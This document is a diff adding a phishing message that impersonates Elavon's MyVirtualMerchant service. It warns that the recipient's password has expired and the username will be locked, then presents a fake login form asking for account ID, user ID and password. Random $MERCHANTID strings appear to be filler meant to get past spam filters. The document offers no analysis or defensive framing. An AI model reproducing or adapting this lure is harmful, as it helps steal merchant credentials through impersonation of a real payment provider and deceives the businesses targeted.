@@ -1,0 +1,19 @@
+MYVIRTUALMERCHANT ALERT - Please update your online account password.
+Dear Elavon Merchants Customer,
+Your password has expired and needs to be renewed. Please take a moment and login to your account.
+If you fail to do so, your username will be locked.
+Sincerely,
+Elavon MErchants Team.
+$MERCHANTID: H2DQLZRCDACRU1U1F8SPCXT5HXVXZNBD6PHCBQ2UJAU5PFSG4YEU7V
+Copyright й 2011 Elavon Inc.
+All rights reserved.
+User Login
+Enter your user name and password information.
+Login
+Credentials
+Account ID:
+User ID:
+Password:
+Confirm Password:
+$MERCHANTID: DNF6JRNZPY5DB7YBA45JHAAXZD8D73WCPKHPHU6V6XE6UG6T8NJA6XM276YVR71Y
+DENV6HLKPQXYTZBEDTZW0XPJAQPZT41U4ZJFDARZU5MRQNWGC52WYAMQPTG73QQWTET4U1TMY2HEW
